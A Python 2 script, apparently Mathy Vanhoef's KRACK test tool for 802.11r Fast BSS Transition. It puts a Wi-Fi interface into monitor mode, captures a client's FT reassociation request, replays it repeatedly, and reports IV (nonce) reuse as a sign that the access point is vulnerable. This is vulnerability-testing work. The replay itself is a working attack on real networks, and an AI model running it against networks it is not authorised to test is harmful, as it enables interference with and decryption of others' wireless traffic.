#!/usr/bin/env python2

# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See LICENSE for more details.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from libwifi import *
import sys, socket, struct, time, subprocess, atexit, select

IEEE_TLV_TYPE_RSN = 48
IEEE_TLV_TYPE_FT  = 55

IEEE80211_RADIOTAP_RATE = (1 << 2)
IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)

#TODO: - Merge code with client tests to avoid code duplication (including some error handling)
#TODO: - Option to use a secondary interface for injection + WARNING if a virtual interface is used + repeat advice to disable hardware encryption
#TODO: - Test whether injection works on the virtual interface (send probe requests to nearby AP and wait for replies)

#### Man-in-the-middle Code ####

class KRAckAttackFt():
	def __init__(self, interface):
		self.nic_iface = interface
		self.nic_mon = interface + "mon"
		self.clientmac = scapy.arch.get_if_hwaddr(interface)

		self.sock  = None
		self.wpasupp = None

		self.reset_client()

	def reset_client(self):
		self.reassoc = None
		self.ivs = IvCollection()
		self.next_replay = None

	def start_replay(self, p):
		assert Dot11ReassoReq in p
		self.reassoc = p
		self.next_replay = time.time() + 1

	def process_frame(self, p):
		# Detect whether hardware encryption is decrypting the frame, *and* removing the TKIP/CCMP
		# header of the (now decrypted) frame.
		# FIXME: Put this check in MitmSocket? We want to check this in client tests as well!
		if self.clientmac in [p.addr1, p.addr2] and Dot11WEP in p:
			# If the hardware adds/removes the TKIP/CCMP header, this is where the plaintext starts
			payload = str(p[Dot11WEP])

			# Check if it's indeed a common LCC/SNAP plaintext header of encrypted frames, and
			# *not* the header of a plaintext EAPOL handshake frame
			if payload.startswith("\xAA\xAA\x03\x00\x00\x00") and not payload.startswith("\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
				log(ERROR, "ERROR: Virtual monitor interface doesn't seem to pass 802.11 encryption header to userland.")
				log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.", showtime=False)
				quit(1)

		# Client performing a (possible new) handshake
		if self.clientmac in [p.addr1, p.addr2] and Dot11Auth in p:
			self.reset_client()
			log(INFO, "Detected Authentication frame, clearing client state")
		elif p.addr2 == self.clientmac and Dot11ReassoReq in p:
			self.reset_client()
			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
				log(INFO, "Detected FT reassociation frame")
				self.start_replay(p)
			else:
				log(INFO, "Reassociation frame does not appear to be an FT one")
		elif p.addr2 == self.clientmac and Dot11AssoReq in p:
			log(INFO, "Detected normal association frame")
			self.reset_client()

		# Encrypted data sent to the client
		elif p.addr1 == self.clientmac and Dot11WEP in p:
			iv = dot11_get_iv(p)
			log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
			if self.ivs.is_iv_reused(p):
				log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
					"AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")

			self.ivs.track_used_iv(p)

	def handle_rx(self):
		p = self.sock.recv()
		if p == None: return

		self.process_frame(p)

	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def run(self):
		self.configure_interfaces()

		self.sock = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)

		# Open the wpa_supplicant client that will connect to the network that will be tested
		self.wpasupp = subprocess.Popen(sys.argv[1:])

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock], [], [], 1)
			if self.sock in sel[0]: self.handle_rx()

			if self.reassoc and time.time() > self.next_replay:
				log(INFO, "Replaying Reassociation Request")
				self.sock.send(self.reassoc)
				self.next_replay = time.time() + 1

	def stop(self):
		log(STATUS, "Closing wpa_supplicant and cleaning up ...")
		if self.wpasupp:
			self.wpasupp.terminate()
			self.wpasupp.wait()
		if self.sock: self.sock.close()


def cleanup():
	attack.stop()

def argv_get_interface():
	for i in range(len(sys.argv)):
		if not sys.argv[i].startswith("-i"):
			continue
		if len(sys.argv[i]) > 2:
			return sys.argv[i][2:]
		else:
			return sys.argv[i + 1]

	return None

if __name__ == "__main__":
	if len(sys.argv) <= 1 or "--help" in sys.argv or "-h" in sys.argv:
		print "See README.md for instructions on how to use this script"
		quit(1)

	# TODO: Verify that we only accept CCMP?
	interface = argv_get_interface()
	if not interface:
		log(ERROR, "Failed to determine wireless interface. Specify one using the -i parameter.")
		quit(1)

	attack = KRAckAttackFt(interface)
	atexit.register(cleanup)
	attack.run()


